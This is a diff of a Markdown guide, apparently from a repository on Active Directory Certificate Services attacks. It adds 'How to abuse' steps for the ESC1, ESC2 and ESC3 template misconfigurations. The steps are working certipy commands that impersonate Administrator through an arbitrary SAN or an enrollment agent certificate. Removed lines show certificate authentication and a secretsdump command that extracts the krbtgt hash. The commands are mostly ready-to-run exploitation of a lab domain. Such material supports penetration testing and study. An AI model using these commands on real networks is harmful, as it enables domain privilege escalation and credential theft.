@@ -91,6 +91,9 @@ The certificate template’s AD object specifies if the requester can specify th
 * Authorized signatures are not required.
 * Have certificate enrollment rights that allow a low-privileged attacker to request and obtain a certificate based on the template.
 
+How to abuse:
+
+* We can request a certificate based on the vulnerable certificate template and specify an arbitrary SAN
 ```
  certipy req 'EVILCORP/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'Vulnerable ESC1' -alt 'Administrator@EvilCorp.local'
  
@@ -116,13 +119,28 @@ Requirements:
 
 ![ADCSXMind](https://github.com/RayRRT/ADCS/blob/main/ESC2.png?raw=true)
 
+
+How to abuse:
+
+1. If the requester can specify a SAN, ESC2 vulnerable certificate can be abused like ESC1:
 ```
+
 certipy req 'EVILCORP/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'Vulnerable ESC2' -alt 'Administrator@EvilCorp.local'
+ 
+```
+2. It can be abused like ESC3 (See below) – the ESC2 vulnerable certificate can be used to request another one on behalf of any other user:
 
-certipy auth -pfx administrator.pfx
+Request a certificate based on the vulnerable certificate template ESC3:
+```
 
-secretsdump.py -hashes :669556eda1adbb10afdf29f42760db39 Administrator@EVILDC1.evilcorp.local -just-dc-user krbtgt
+certipy req 'EvilCorp/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'Vulnerable ESC3'
+ 
+```
+Now, we can then use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user:
+ 
+```
 
+certipy req 'EvilCorp/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'ESC3C2' -on-behalf-of 'EvilCorp\Administrator' -pfx 'thehorseman.pfx'
  
 ```
 
